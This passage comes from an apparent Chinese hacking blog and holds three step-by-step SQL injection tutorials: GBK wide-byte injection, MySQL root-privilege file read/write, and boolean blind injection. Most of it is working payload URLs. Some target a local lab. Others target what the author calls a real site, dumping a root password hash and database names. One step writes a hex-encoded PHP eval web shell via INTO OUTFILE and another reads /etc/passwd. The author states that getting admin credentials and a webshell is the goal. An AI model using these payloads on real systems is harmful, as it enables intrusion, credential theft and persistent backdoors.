<p>5,通过观察打出来的sql语句,可以发现,那个 ‘%df’和’\’ 在gbk字符编码中变成了‘運’字,所以这才会造成转义才会失效,既如此,闭合自然就非常简单了,因为是字符型注入,只需要把前面的单引号闭合,后面的语句直接注释掉即可,具体的注入语句如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.23/wide</span><span class="regexp">/0x01/index</span>.php?id=<span class="number">2</span>%df<span class="string">'and 1=1 %23   条件为真时返回正常</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/wide_type_5.png" alt="&#39;&#39;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.23/wide</span><span class="regexp">/0x01/index</span>.php?id=<span class="number">2</span>%df<span class="string">' and 1=12 %23 条件为真时返回异常</span></span><br></pre></td></tr></table></figure>
<p><img src="/img/wide_type_6.png" alt="&#39;&#39;"><br></p>
<p>6,查询当前表的字段个数<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.23/wide</span><span class="regexp">/0x01/index</span>.php?id=<span class="number">2</span>%df<span class="string">' order by 3 %23 为3时返回正常</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/wide_type_7.png" alt="&#39;&#39;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.23/wide</span><span class="regexp">/0x01/index</span>.php?id=<span class="number">2</span>%df<span class="string">' order by 4 %23 为4时返回异常,说明当前表有3个字段</span></span><br></pre></td></tr></table></figure>
<p><img src="/img/wide_type_8.png" alt="&#39;&#39;"><br></p>
<p>7,执行union,爆出对应的数据显示位<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.23/wide</span><span class="regexp">/0x01/index</span>.php?id=<span class="number">2</span>%df<span class="string">' and 1=21 UNION SELECT 1,2,3 %23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/wide_type_9.png" alt="&#39;&#39;"><br></p>
<p>8,搜集当前数据库信息,这里只是为了给大家演示下宽字节的正常注入流程,就不再尝试读写文件了,暂时按照正常的权限来,有兴趣可自行尝试<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.23/wide</span><span class="regexp">/0x01/index</span>.php?id=<span class="number">2</span>%df<span class="string">' and 1=21 UNION SELECT 1,database(),version() %23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/wide_type_10.png" alt="&#39;&#39;"><br></p>
<p>9,查出当前库中的所有表名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.23/wide</span><span class="regexp">/0x01/index</span>.php?id=<span class="number">2</span>%df<span class="string">' and 1=12 union select 1,group_concat(table_name),user() from information_schema.tables where table_schema=0x64617461 %23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/wide_type_11.png" alt="&#39;&#39;"><br></p>
<p>10,查出admin表中的所有字段名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.23/wide</span><span class="regexp">/0x01/index</span>.php?id=<span class="number">2</span>%df<span class="string">' and 1=12 union select 1,group_concat(column_name),user() from information_schema.columns where table_name=0x61646d696e %23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/wide_type_12.png" alt="&#39;&#39;"><br></p>
<p>11,最后,去查出管理的账号密码数据即可<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.23/wide</span><span class="regexp">/0x01/index</span>.php?id=<span class="number">2</span>%df<span class="string">' and 1=12 union select 1,name,pass from admin limit 0,1 %23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/wide_type_13.png" alt="&#39;&#39;"><br><br></p>
<p>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;篇幅原因,这里只简单演示了GBK一种编码,至于GB2312等其它的一些宽字节字符集,也都会有这样的问题,关于宽字节注入,其实原理非常简单,就是数据库对不同编码的理解差异所造成的,最好的修复方法,就是全站(前后端全局统一)统一用utf-8,在适当的闭合后,注入语句和常规的注入语句基本没有任何差别,记得多找实例练习即可<br><br></p>

          
        
      
    </div>
    
    
    


    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://evil-404.github.io/mysql-root-injection.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="VK">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="https://ws1.sinaimg.cn/large/baeae4e0ly1fsu7yzju7lj20af0a0wej.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Evil-404">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/mysql-root-injection.html" itemprop="url">sql注入入门 之 mysql root权限下的注入利用方式</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-05-15T01:13:07+08:00">
                2016-05-15
              </time>
            

            
              <span class="post-meta-divider">|</span>
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-check-o"></i>
              </span>
              
                <span class="post-meta-item-text">更新于&#58;</span>
              
              <time title="更新于" itemprop="dateModified" datetime="2017-06-24T23:59:29+08:00">
                2017-06-24
              </time>
            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            

            

              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/all-sql-injection/" itemprop="url" rel="index">
                    <span itemprop="name">all sql injection</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1,917
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  8
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><br><br>1,mysql root权限,实例注入点,如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/news</span>_view.php?id=<span class="number">9</span>&amp;vid=<span class="number">192</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_root1.png" alt="&#39;&#39;"><br></p>
<p>2,尝试用单引号去干扰vid参数,数据库报错,唉,竟然没顺带一起丢出目标网站的物理路径,差评,嘿嘿……<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/news</span>_view.php?id=<span class="number">9</span>&amp;vid=<span class="number">192</span><span class="string">'</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_root2.png" alt="&#39;&#39;"><br></p>
<p>3,尝试闭合<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/news</span>_view.php?id=<span class="number">9</span>&amp;vid=<span class="number">192</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span>   这次看来是个标准的mysql数字型注入了,条件为真时页面返回正常</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_root3.png" alt="&#39;&#39;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/news</span>_view.php?id=<span class="number">9</span>&amp;vid=<span class="number">192</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">112</span> 条件为假时页面返回异常,再次注入点确实存在</span><br></pre></td></tr></table></figure>
<p><img src="/img/mysql_root4.png" alt="&#39;&#39;"><br></p>
<p>4,获取当前表的字段个数,为后面union做准备<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/news</span>_view.php?id=<span class="number">9</span>&amp;vid=<span class="number">192</span> order by <span class="number">31</span> 个数为<span class="number">31</span>目标页面返回正常</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_root5.png" alt="&#39;&#39;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/news</span>_view.php?id=<span class="number">9</span>&amp;vid=<span class="number">192</span> order by <span class="number">32</span> 个数为<span class="number">32</span>时页面返回错误,可知当前表的字段个数为<span class="number">31</span>个</span><br></pre></td></tr></table></figure>
<p><img src="/img/mysql_root6.png" alt="&#39;&#39;"><br></p>
<p>5,开始执行union爆出对应的数据显示位<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/news</span>_view.php?id=<span class="number">9</span>&amp;vid=<span class="number">192</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> UNION SELECT <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">31</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_root7.png" alt="&#39;&#39;"><br></p>
<p>6,搜集数据库信息,如下可知,这是个root权限的注入点,既然是root,那就好办了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/news</span>_view.php?id=<span class="number">9</span>&amp;vid=<span class="number">192</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> UNION SELECT <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,user(),<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,version(),<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,@@basedir,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">31</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_root8.png" alt="&#39;&#39;"><br></p>
<p>7,因为是真实站点,我就不瞎动别人东西了,希望大家也养成这样的习惯,不要随意去碰别人的东西,尤其是一些可能存在潜在危险的敏感操作,这里只是单纯查查肯定是没什么问题了,如果是别的就不一定了,(此后的所有的演示说明都是如此,一律点到为止,杜绝’深入探讨’),后面关于读写文件的操作,等会儿都会留在本地做,这里我们就尝试把它的root的密码hash查出来就可以了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/news</span>_view.php?id=<span class="number">9</span>&amp;vid=<span class="number">192</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> UNION SELECT <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,user,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,password,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">31</span> from mysql.user limit <span class="number">0</span>,<span class="number">1</span>  %<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_root8_1.png" alt="&#39;&#39;"><br></p>
<p>8,最终,得到的root的密码hash如下,如果是实际测试,你还可以顺手telnet下目标的3306,假设目标的mysql能外联,直接用nvaicat连上去操作也许会更方便点<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root : *<span class="number">13</span>A03393631C03176D03A9F5C13CB*******</span><br></pre></td></tr></table></figure></p>
<p><br><br><br></p>
<p>9,这里root权限下的读写操作,就以bwapp中的注入练习为例进行说明了,首先,我们尝试读取目标系统中的/etc/passwd文件,下面的十六进制数据是/etc/passwd hex后的内容<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.47/b</span>WAPP/sqli_2.php?movie=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> UNION SELECT <span class="number">1</span>,load_file(<span class="number">0x2f6574632f706173737764</span>),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> %<span class="number">23</span>&amp;action=go</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_root9.png" alt="&#39;&#39;"><br><br></p>
<p>10,依然是上面的注入点,这次我们尝试向目标的网站目录中写入php一句话,下面的十六进制数据的明文是&lt;?php @eval($_POST[‘klion’]);?&gt;,后面则是目标网站的物理路径,意思就是把这个一句话写到这个目录中,如下可以看到,提示不能写,原因很明显,因为以你当前的用户身份对这个目录是没有写权限的,如果想写进去,就只能自己动手去把权限放宽一些,因为这里是在本地测试,权限不够,自己给一下就可以了,但实际测试中,如果没权限,那你就只能看看读,如果读也不能读,mysql的root密码hash总也能查出来吧,再或者如果真的是权限被降的一塌糊涂,网站的管理表总归是可以查的吧,按正常的注入把管理员的账号查出来再登到后台传shell也是可以的<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.47/b</span>WAPP/sqli_2.php?movie=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> UNION SELECT <span class="number">1</span>,<span class="number">0x3c3f70687020406576616c28245f504f53545b6b6c696f6e5d293f3e</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> into outfile <span class="string">'/var/www/bWAPP/admin/shell.php'</span> %<span class="number">23</span>&amp;action=go</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_root10.png" alt="&#39;&#39;"><br><br></p>
<p>可以看到,当我们放开权限之后,shell被正常写进去了,虽然报了点警告,但无伤大雅<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.47/b</span>WAPP/sqli_2.php?movie=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> UNION SELECT <span class="number">1</span>,<span class="number">0x3c3f70687020406576616c28245f504f53545b6b6c696f6e5d293f3e</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> into outfile <span class="string">'/var/www/bWAPP/admin/shell.php'</span> %<span class="number">23</span>&amp;action=go</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_root11.png" alt="&#39;&#39;"><br><br></p>
<p>细心的表哥们可能会看到,这里的一句话掉了个分号,其实,在php中最后一行代码不加分号是可行的<br><img src="/img/mysql_root12.png" alt="&#39;&#39;"></p>
<p>执行似乎没什么问题,现在尝试用菜刀连一下,脚本正常执行,shell正常连接<br><img src="/img/mysql_root13.png" alt="&#39;&#39;"><br><img src="/img/mysql_root14.png" alt="&#39;&#39;"><br><br></p>
<p>关于mysql root权限下的权限利用需要注意的一些点:<br><code>(1),正常情况下mysql的root用户确实可以在数据库中为所欲为,但这并不意味着你在目标操作系统中也可以为所欲为,如果启动mysql服务的用户身份只是系统的一个普通用户,那么你在系统中的权限撑死了也就只是个普通用户权限,因为你继承的是那个启动mysql服务的用户权限,说这些只是为了让大家对于mysql root权限下的文件读写利用有个更清晰的认识,大多数时候你会发现,即使你确实是mysql的root用户,但依然没法正常的读写文件,原因就是我上面说的这些,因为你的mysql服务用户只是个普通用户权限,而这个用户对你要操作的那个目录或文件没有读写权限,自然就读写不了,当然,这是基于系统的文件系统权限而言</code><br><code>(2),另外,还有一种情况,假设你对目标的网站目录有正常的读写权限,但是目标在安装完mysql以后对root用户进行了一些权限优化,比如,我想让root只能正常的增删改查,之外的权限全删掉,这时候,你再想进行文件读写,也可能是不行的,因为file权限很可能被干掉了</code><br><code>(3),最后,还可能会有一些别的情况,比如,网站目录被waf或其他的一些防护工具所监控,当你写webshell时,直接就被杀掉或者报警拦截之类的</code><br><code>(4),退一万步来讲,即使你真的没办法读写文件,但这并不妨碍你正常查询数据,拿到网站管理员的账号密码,登到后台传shell也是可以的,不用一条路走到黑,多变通</code><br><code>(5),其实,有时候也可以利用root用户执行系统命令,即udf,有一种提权方法,叫udf提权,利用的就是此特性,还是那句话,即使能执行系统命令,但这并不意味一定可以达到提权(对于linux来讲是直接提到root权限)的效果,关于udf的东西,我们后续再单独说,这里就暂时先放过</code><br><br></p>
<p>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;其实,就mysql本身的文件读写来讲,非常简单,只是背后的权限映射,需要大家稍微理解下,个人觉得挺好理解的,又没什么拐弯抹角的,都是死东西,相信你只要以前好好琢磨过操作系统的用户组权限,这个对你来说,基本是一点就通,在操作系统中,所有的程序,都是工作在某种安全上下文中的,而这个安全上下文大多数都是由用户来控制和决定的,好吧,稍不留神又TM跑题了,汗……<br><br></p>

          
        
      
    </div>
    
    
    


    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://evil-404.github.io/mysql-bool-blind-injection.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="VK">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="https://ws1.sinaimg.cn/large/baeae4e0ly1fsu7yzju7lj20af0a0wej.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Evil-404">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/mysql-bool-blind-injection.html" itemprop="url">sql注入入门 之 mysql 布尔型盲注</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-05-14T23:50:44+08:00">
                2016-05-14
              </time>
            

            
              <span class="post-meta-divider">|</span>
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-check-o"></i>
              </span>
              
                <span class="post-meta-item-text">更新于&#58;</span>
              
              <time title="更新于" itemprop="dateModified" datetime="2017-06-24T23:55:37+08:00">
                2017-06-24
              </time>
            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            

            

              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/all-sql-injection/" itemprop="url" rel="index">
                    <span itemprop="name">all sql injection</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1,950
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  8
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><br><br>1,实例 mysql 盲注点,如下,虽然这并不是个标标准准的盲注点,但并不影响我们用盲注的方式来获取数据,以后遇到纯正的盲注点,我们再补充:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/wexpage</span>.php?id=<span class="number">21</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_bind_bool1.png" alt="&#39;&#39;"><br></p>
<p>2,一阵单引号过后,目标数据库如期报错,对于mysql来讲,一般出现这情况,百分之九十九可以确定这就是个正儿八经的注入点<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/wexpage</span>.php?id=<span class="number">21</span><span class="string">'</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_bind_bool2.png" alt="&#39;&#39;"><br></p>
<p>3,尝试闭合,还是前面的问题,不要一眼看到数字就认定它是个数字型注入,比如该实例就又是个字符型注入,我们只需闭合前面的单引号注释掉后面的语句就可以了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/wexpage</span>.php?id=<span class="number">21</span><span class="string">' and 121=121 %23 条件为真时,页面返回正常</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_bind_bool3.png" alt="&#39;&#39;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/wexpage</span>.php?id=<span class="number">21</span><span class="string">' and 121=1 %23  条件为假时,页面返回错误,到这一步可以确认它确实是个注入点</span></span><br></pre></td></tr></table></figure>
<p><img src="/img/mysql_bind_bool4.png" alt="&#39;&#39;"><br></p>
<p>4,按照以往的流程,我们接下来应该是查询当前表的字段个数,然后执行union,流程如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/wexpage</span>.php?id=<span class="number">21</span><span class="string">'order by 7 %23 字段为7个时,目标页面返回正常</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_bind_bool5.png" alt="&#39;&#39;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/wexpage</span>.php?id=<span class="number">21</span><span class="string">'order by 8 %23 字段个数为8时,页面返回异常,可知当前表的字段个数为7个</span></span><br></pre></td></tr></table></figure>
<p><img src="/img/mysql_bind_bool6.png" alt="&#39;&#39;"><br></p>
<p>执行union,爆出对应的数据显示位,好,关于利用union注入的方式,我们到此打住,今天的重点主要是为了说明如何进行布尔型盲注,而非union的方式注入,这里顺带再次提及union的目的只是为了告诉大家,一个注入点,我们通常有n种注入方式,当某种方式受限时,不妨多换换姿势,尽量不要一条道走到黑,反正我们最终的目的只是为了拿到管理员账号密码登到后台获取webshell,至于具体用什么方法,无所谓,怎么快怎么来,毕竟我们这里并不是在做学术研究<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/wexpage</span>.php?id=<span class="number">21</span><span class="string">' and 1=2 UNION SELECT 1,2,3,4,5,6,7 %23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_bind_bool7.png" alt="&#39;&#39;"><br></p>
<p>5,好,啰嗦了一堆废话,正式开始今天的布尔型盲注,不过,在此之前我们还需要搞清楚一些问题,既是盲注,也就意味着,它不需要报错,不需要知道准确的字段个数,更不需要数据的显示位,归根结底它只关心一点,也就是,我们自己的sql到底有没有被执行成功,那么,又该怎么判断我们的sql有没有执行成功呢,其实很简单,如果是布尔型盲注,直接观察页面的返回正常与否即可,如果是时间盲注,看它是不是按照自己规定的延迟时间来响应的,等等……<br><br></p>
<p>6,说了这么多,我们现在回到正题,”布尔型”盲注,因为布尔型盲注没有任何参考,只能靠观察目标页面的返回来判断我们的语句是否执行成功,所以我们只能通过一位位的字符截取然后逐个对比判断来获取准确数据,如下,搜集目标数据库相关信息<br><br></p>
<p>截取数据库版本名称的第一位字符并返回其ASCII码值,当它等于我们所指定的值时,页面返回正常,此时去查出这个值对应的ASCII码字符是什么,后面都是如此,你可以依次递增,查出完整的数据库版本,这里为了节约篇幅,中间的过程就省略了,最后,查出完整的版本号为 ‘5.6.35’<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/wexpage</span>.php?id=<span class="number">21</span><span class="string">' and  (select ascii(substring((select version()),1,1))=53) %23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_bind_bool8.png" alt="&#39;&#39;"><br></p>
<p>截取当前数据库名称的第一位字符并返回其ASCII码值,依次递增,即可查出完整的数据库名称,完整的数据库名称为’wexnepal_2012’<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/wexpage</span>.php?id=<span class="number">21</span><span class="string">' and  (select ascii(substring((select database()),1,1))=119) %23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_bind_bool9.png" alt="&#39;&#39;"><br></p>
<p>截取当前数据库用户名的第一位字符并返回其ASCII码值,依次递增,查出完整的用户名,完整的用户名为‘wexnepal_2012@localhost’<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/wexpage</span>.php?id=<span class="number">21</span><span class="string">' and  (select ascii(substring((select user()),1,1))=119) %23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_bool_injection_s.png" alt="&#39;&#39;"><br></p>
<p>7,尝试获取所有的数据库名(依然是那句话,’所有’指的是你有权限看到的)</p>
<p>获取第一个数据库名的第一位字符,并返回其对应的ASCII码值,依次递增查出完整信息,第一个数据库名为’information_schema’<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/wexpage</span>.php?id=<span class="number">21</span><span class="string">' and (select ascii(substring((select schema_name from information_schema.schemata limit 0,1),1,1))=105) %23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_bind_bool10.png" alt="&#39;&#39;"><br></p>
